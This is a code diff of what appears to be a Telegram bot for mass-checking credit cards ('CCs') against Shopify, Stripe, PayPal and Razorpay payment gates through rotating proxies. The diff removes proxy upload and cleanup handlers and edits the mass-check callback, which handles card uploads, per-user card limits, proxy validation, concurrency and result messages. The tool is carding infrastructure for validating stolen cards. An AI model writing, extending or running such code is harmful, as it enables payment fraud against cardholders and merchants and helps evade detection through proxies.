-    @bot.callback_query_handler(func=lambda call: call.data == "proxy_upload_prompt")
-    def proxy_upload_prompt(call):
-        try:
-            bot.answer_callback_query(call.id)
-        except:
-            pass
-        safe_send(bot.send_message, call.message.chat.id,
-            "📂 <b>Send me a .txt file with proxies (one per line).</b>",
-            parse_mode='HTML')
-        user_sessions[call.from_user.id] = user_sessions.get(call.from_user.id, {})
-        user_sessions[call.from_user.id]['awaiting_proxy_file'] = True
-
-    @bot.callback_query_handler(func=lambda call: call.data == "proxy_clean")
-    def proxy_clean_callback(call):
-        try:
-            bot.answer_callback_query(call.id, "Starting cleanup...")
-        except:
-            pass
-        user_id = call.from_user.id
-        user_proxies = get_user_proxies(user_id)
-        if not user_proxies:
-            safe_send(bot.send_message, call.message.chat.id, "You have no personal proxies to clean.")
-            return
-        msg = safe_send(bot.send_message, call.message.chat.id, f"🧹 Cleaning your {len(user_proxies)} proxies...")
-        import threading
-        def clean_task():
-            live = validate_proxies_strict(user_proxies, bot, call.message)
-            if msg:
-                if len(live) == len(user_proxies):
-                    safe_send(bot.edit_message_text, "✅ All your proxies are live!", call.message.chat.id, msg.message_id)
-                else:
-                    removed = len(user_proxies) - len(live)
-                    save_user_proxies(user_id, live)
-                    safe_send(bot.edit_message_text, f"✅ Removed {removed} dead proxies.\nYou now have {len(live)} live proxies.", call.message.chat.id, msg.message_id)
-            else:
-                if len(live) == len(user_proxies):
-                    safe_send(bot.send_message, call.message.chat.id, "✅ All your proxies are live!")
-                else:
-                    removed = len(user_proxies) - len(live)
-                    save_user_proxies(user_id, live)
-                    safe_send(bot.send_message, call.message.chat.id, f"✅ Removed {removed} dead proxies.\nYou now have {len(live)} live proxies.")
-        threading.Thread(target=clean_task).start()
-
+    # ============================================================================
+    # CALLBACKS FOR MASS CHECKS (Shopify, Stripe, PayPal, Razorpay)
+    # ============================================================================
     @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
     def callback_shopify(call):
         try:
@@ -2628,16 +2283,13 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             user_id = call.from_user.id
             if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
                 return
-
             try:
                 safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
             except:
                 pass
-
             if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                 safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
                 return
-
             ccs = user_sessions[user_id]['ccs']
             if user_id not in OWNER_ID:
                 remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
@@ -2654,32 +2306,26 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                     ccs = ccs[:user_limit]
                     safe_send(bot.send_message, call.message.chat.id,
                         f"⚠️ Limit for this gate is {user_limit} cards. Truncated.", parse_mode='HTML')
-
             proxies = get_active_proxies(user_id)
             if not proxies:
                 safe_send(bot.send_message, call.message.chat.id, "🚫 Proxy Required!")
                 return
-
             active_proxies = validate_proxies_strict(proxies, bot, call.message)
             if not active_proxies:
                 safe_send(bot.send_message, call.message.chat.id, "❌ All proxies dead.")
                 return
-
             if is_user_busy(user_id):
                 safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy. Cancel current check first.")
                 return
-
             if not mass_check_semaphore.acquire(blocking=False):
                 safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
                 return
-
             set_user_busy(user_id, True)
             send_to_dm = user_sessions.get(user_id, {}).get('send_results_to_dm', False)
             dm_user = user_id if send_to_dm else None
             start_msg = safe_send(bot.send_message, call.message.chat.id,
                 f"⚡ <b>{gate_name} Mass Check Started...</b>\n💳 Cards: {len(ccs)}\n🔌 Proxies: {len(active_proxies)}",
                 parse_mode='HTML')
-
             import threading
             def mass_thread():
                 try:
@@ -2690,7 +2336,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 finally:
                     mass_check_semaphore.release()
                     set_user_busy(user_id, False)
-
             threading.Thread(target=mass_thread).start()
 
     @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
